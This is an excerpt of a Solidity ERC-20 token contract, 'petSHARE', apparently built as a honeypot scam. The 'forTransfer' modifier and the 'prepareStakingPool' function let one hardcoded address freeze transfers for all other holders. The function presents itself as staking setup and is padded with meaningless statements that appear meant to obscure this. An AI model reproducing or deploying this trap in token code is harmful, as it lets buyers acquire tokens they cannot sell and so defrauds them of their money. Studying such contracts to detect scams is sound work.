...
contract petSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenPS_totalSupply;
    uint256 private _tokenPS_status = 0;
    uint256 public stakingPoolPSStatus = 0;

    string private _tokenPS_name;
    string private _tokenPS_symbol;

    address private _poolPSAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenPS_name = "petSHARE";
        _tokenPS_symbol = "petSHARE";
        _tokenPS_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenPS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolPSAddress || _tokenPS_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolPSStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolPSAddress)
        {
            _tokenPS_status = 1;
        }
    }
